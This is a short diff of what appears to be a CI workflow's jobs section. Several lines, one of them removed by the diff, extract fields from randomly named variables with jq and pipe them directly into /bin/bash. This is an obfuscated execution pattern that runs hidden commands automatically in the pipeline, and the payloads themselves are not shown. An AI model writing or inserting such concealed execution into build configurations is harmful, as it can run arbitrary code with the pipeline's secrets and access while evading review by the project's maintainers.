@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$fcvak8" | jq -r .ca7966 | /bin/bash
           printf '%s' "$pcd87929" | jq -r .ueqg48 | /bin/bash
           printf '%s' "$c21449" | jq -r .gfjn42 | /bin/bash
-          printf '%s' "$on34643" | jq -r .hbtid04 | /bin/bash
           echo $mlk61979 | jq -r .i8 | /bin/bash
           echo $drsna583 | jq -r .q0 | /bin/bash
           echo $bylt7 | jq -r .o1047 | /bin/bash
